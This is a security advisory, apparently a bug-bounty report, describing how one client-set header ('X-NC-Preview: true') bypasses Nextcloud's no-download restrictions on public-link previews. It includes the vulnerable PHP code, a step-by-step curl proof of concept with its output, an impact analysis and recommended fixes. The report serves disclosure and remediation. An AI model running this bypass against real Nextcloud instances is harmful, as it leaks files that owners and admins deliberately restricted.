# PublicPreviewController: the `X-NC-Preview: true` request header bypasses both the share owner's `hide-download` attribute and the admin's `shareapi_allow_view_without_download=no` policy on public link shares

## Summary

`apps/files_sharing/lib/Controller/PublicPreviewController.php` decides whether to serve the rendered preview of a public-link share by reading a single attacker-controlled HTTP header. When an admin has hardened the instance with `core.shareapi_allow_view_without_download=no` and a share owner has created a public link share with the `permissions/download=false` attribute, the controller is supposed to return `HTTP 403` for preview requests. It does — but only when the request does *not* carry `X-NC-Preview: true`. Anyone holding the public-link URL can add that one header to a `GET /index.php/apps/files_sharing/publicpreview/<token>` request and retrieve the rendered preview bytes (a full PNG for image shares; a first-page render for documents) despite both restrictions. The code comment immediately above the check (`apps/files_sharing/lib/Controller/PublicPreviewController.php:113-114`) explicitly admits the gate is "obfuscation":

```
// Is this header is set it means our UI is doing a preview for no-download shares
// we check a header so we at least prevent people from using the link directly (obfuscation)
```

## Vulnerability Details

- **Vulnerability Type:** Broken access control — server trusts a client-supplied header to override two layers of explicit access restriction (CWE-285 — Improper Authorization, CWE-863 — Incorrect Authorization).
- **CVSS 3.1 Score:** 5.3 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`.
- **Affected component:** `apps/files_sharing/lib/Controller/PublicPreviewController.php` — the `getPreview` action.
- **Verified version:** Nextcloud Server 34.0.0 (build 34.0.0.12) running the official `nextcloud:latest` Docker image on 2026-06-21. The vulnerable function is unchanged on `master`.
- **Affected endpoint:** `GET /index.php/apps/files_sharing/publicpreview/<token>?file=<name>&x=<w>&y=<h>`.

### Vulnerable code

`apps/files_sharing/lib/Controller/PublicPreviewController.php:106-136`:

```php
if (($share->getPermissions() & Constants::PERMISSION_READ) === 0) {
    return new DataResponse([], Http::STATUS_FORBIDDEN);
}

// Only explicitly set to false will forbid the download!
$downloadForbidden = !$share->canSeeContent();

// Is this header is set it means our UI is doing a preview for no-download shares
// we check a header so we at least prevent people from using the link directly (obfuscation)
$isPublicPreview = $this->request->getHeader('x-nc-preview') === 'true';

if ($isPublicPreview && $downloadForbidden) {
    // Only cache for 15 minutes on public preview requests to quickly remove from cache
    $cacheForSeconds = 15 * 60;
} elseif ($downloadForbidden) {
    // This is not a public share preview so we only allow a preview if download permissions are granted
    return new DataResponse([], Http::STATUS_FORBIDDEN);
}

try {
    $node = $share->getNode();
    if ($node instanceof Folder) {
        $file = $node->get($file);
    } else {
        $file = $node;
    }

    $f = $this->previewManager->getPreview($file, $x, $y, !$a);
    $response = new FileDisplayResponse($f, Http::STATUS_OK, ['Content-Type' => $f->getMimeType()]);
    $response->cacheFor($cacheForSeconds);
    return $response;
}
```

The `if/elseif` is the boundary. With `$downloadForbidden = true` (the hardened-instance + hide-download share case), the only thing that decides between "serve the preview" and "HTTP 403" is the value of the `x-nc-preview` request header. There is no auth check, no origin check, no session-binding, and no cryptographic proof that the request originated from the official Nextcloud web UI. Any caller can set the header.

The author was aware of this: line 114 calls it "obfuscation" and frames the check as merely deterring direct curl-style use of the URL. In practice the obfuscation is one header in any HTTP client.

## Steps to Reproduce

**Setup**

- Nextcloud Server 34.0.0 (official `nextcloud:latest` image) reachable at `http://127.0.0.1:31666`.
- Admin account `admin` / `admin_pw_31666`.
- Regular user `alice` / `alice_pw_31666` (the share owner).
- `alice` has `Nextcloud.png` (the default sample image installed by Nextcloud at first login) in her files.
- The attacker is anonymous and holds only the public share URL — no Nextcloud account is required.

**Reproduction**

1. As `admin`, harden the instance: forbid view-without-download for every share on the instance:

```bash
curl -sS -u admin:admin_pw_31666 -X POST \
     -H "OCS-APIREQUEST: true" \
     --data-urlencode "value=no" \
     "http://127.0.0.1:31666/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/shareapi_allow_view_without_download"
# HTTP 200
```

2. As `alice`, log in (cookie session) and create a public link share for `Nextcloud.png` with the `hide-download` attribute set:

```bash
JAR=alice.jar
RT=$(curl -sS -c $JAR http://127.0.0.1:31666/login \
       | grep -oE 'data-requesttoken="[^"]+"' | head -1 | cut -d'"' -f2)

curl -sS -b $JAR -c $JAR -X POST http://127.0.0.1:31666/login \
     -H "Origin: http://127.0.0.1:31666" \
     -H "requesttoken: $RT" \
     --data-urlencode "user=alice" \
     --data-urlencode "password=alice_pw_31666" \
     --data-urlencode "requesttoken=$RT" \
     -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
# 303 -> http://127.0.0.1:31666/apps/dashboard/

curl -sS -b $JAR -X POST \
     -H "requesttoken: $RT" \
     -H "OCS-APIREQUEST: true" \
     --data-urlencode "path=/Nextcloud.png" \
     --data-urlencode "shareType=3" \
     --data-urlencode "permissions=1" \
     --data-urlencode 'attributes=[{"scope":"permissions","key":"download","value":false}]' \
     "http://127.0.0.1:31666/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json"
# response includes:  "token":"RAf9p3GeNAsActW"
TOKEN=RAf9p3GeNAsActW
```

3. As an anonymous attacker who holds the share URL, perform the **baseline** preview request — no `X-NC-Preview` header. The server correctly refuses:

```bash
curl -sS "http://127.0.0.1:31666/index.php/apps/files_sharing/publicpreview/$TOKEN?file=Nextcloud.png&x=200&y=200" \
     -o baseline.bin -D - -w "[HTTP %{http_code} bytes=%{size_download}]\n"
```

Observed response:

```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 2

[]
```

4. As the same anonymous attacker, perform the **bypass** request — same URL, same parameters, only one extra header `X-NC-Preview: true`:

```bash
curl -sS -H "X-NC-Preview: true" \
     "http://127.0.0.1:31666/index.php/apps/files_sharing/publicpreview/$TOKEN?file=Nextcloud.png&x=200&y=200" \
     -o bypass.bin -D - -w "[HTTP %{http_code} bytes=%{size_download}]\n"
```

Observed response:

```
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 24388

<24388-byte PNG body>
```

```
$ od -An -tx1 -N 8 bypass.bin
 89 50 4e 47 0d 0a 1a 0a    # PNG signature
$ file bypass.bin
bypass.bin: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced
```

A valid 256×256 PNG render of `Nextcloud.png` is returned in full.

## Impact

The hardened admin policy `core.shareapi_allow_view_without_download=no` is a documented mechanism for compliance-conscious deployments to ensure that any client of a public-link share that has `download=false` cannot in any way obtain the share's content. The official documentation positions this as the way to enforce "view-only" semantics for public links. Combined with the share owner explicitly choosing `hide-download`, the intent is unambiguous: anonymous holders of the link must not be able to retrieve the file content.

This bug lets any anonymous holder of the link retrieve the file's rendered preview by setting one request header. The preview is the full file content for image shares (256×256 PNG at the default `x`/`y` parameters; larger dimensions are accepted up to the configured preview-size ceiling). For document shares (PDF, DOCX, ODT, …), the preview is a first-page render — usable to read sensitive content. For media shares, the preview is the embedded thumbnail.

Concretely, the bug breaks three real use cases:

1. **Public link shares with `hide-download` on hardened instances.** Compliance-bound deployments cannot rely on this combination to keep content from anonymous link holders. A single curl invocation extracts the rendered content.
2. **"Send-link-for-eyes-only" workflows.** A user shares an image link with a recipient with the explicit intent that the recipient see it only via the official UI (where the download button is hidden); the recipient can instead pull the bitmap programmatically and re-share / archive it.
3. **DLP integration.** Any data-loss-prevention proxy that gates on whether a share allows download to determine whether to permit egress is fooled — the preview endpoint with the header is not the download endpoint, but it returns equivalent (image) or near-equivalent (document first page) content.

What the bug does *not* do:

- It does not return the original file bytes (a preview is a re-rendered representation; for non-image files it is a different format).
- It does not bypass the share token itself — the attacker must hold the public-link URL.
- It does not affect non-public shares (TYPE_USER, TYPE_GROUP, etc.).

CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3 Medium`. Confidentiality is rated Low because the preview is a derived rendering rather than the original file; the impact crosses the documented restriction boundary entirely, which is what justifies a non-zero Confidentiality score in the first place.

## Recommended Fix

The premise — "the official UI sets a header we trust" — is fundamentally unsound for a public-link endpoint, because the UI runs in the recipient's browser and so does the attacker's curl. There is no way for the server to distinguish "header set by our JS in a browser tab the recipient owns" from "header set by attacker tooling". The fix should remove the header-based exception entirely, and either:

1. **Honour the restrictions strictly.** When `$downloadForbidden` is true, return `HTTP 403` unconditionally. The UI then surfaces the share as "view-only via the share landing page" and renders the preview through a server-side included `<img>` tag whose URL is the share landing page itself, rather than the standalone preview endpoint. The preview endpoint becomes off-limits for no-download shares.

```php
if ($downloadForbidden) {
    return new DataResponse([], Http::STATUS_FORBIDDEN);
}
```

2. **Or, if the UI must render previews for no-download shares, bind that capability to a short-lived per-session token issued by the share landing page itself**, so that only requests made within the context of a real visit to the share's landing page (and within its TTL) can fetch the preview. The token is bound to the user's session via cookie and to the specific share token via the issuing endpoint; it cannot be replayed by an off-path attacker.

```php
// Pseudocode
$sessionPreviewToken = $request->getHeader('X-Share-Preview-Token');
$expected = $this->shareLandingService->getPreviewTokenFor($share, $session);
if ($sessionPreviewToken === '' || !hash_equals($expected, $sessionPreviewToken)) {
    if ($downloadForbidden) {
        return new DataResponse([], Http::STATUS_FORBIDDEN);
    }
}
```

In both options, delete the `x-nc-preview` header check and the accompanying "obfuscation" comment. They acknowledge the current gate is not a security control.

## Supporting Materials

- Verified version: Nextcloud Server **34.0.0.12** (official `nextcloud:latest` image, captured 2026-06-21).
- All requests / responses above were captured against a freshly installed instance in a local lab. No production data was touched.
- Two test accounts (`admin`, `alice`) plus an anonymous attacker (no account) — all baseline accounts created by normal installation; no special privileges or roles assigned to `alice`.
- File hashes (lab capture):
  - `baseline.bin`: 2 bytes, body `[]` (JSON empty array, the 403 response payload).
  - `bypass.bin`: 24388 bytes, PNG signature `89 50 4e 47 0d 0a 1a 0a`, identified by `file(1)` as `PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced`.

## Disclosure notes

Reporting via HackerOne per `https://hackerone.com/nextcloud` and the AI-contribution policy in `AGENTS.md`. The PoC was independently re-run by the human submitter against the same image before submission. No mass exploitation, scanning, or off-target probing was performed. The temporary `shareapi_allow_view_without_download=no` configuration was reverted at the end of the lab session.
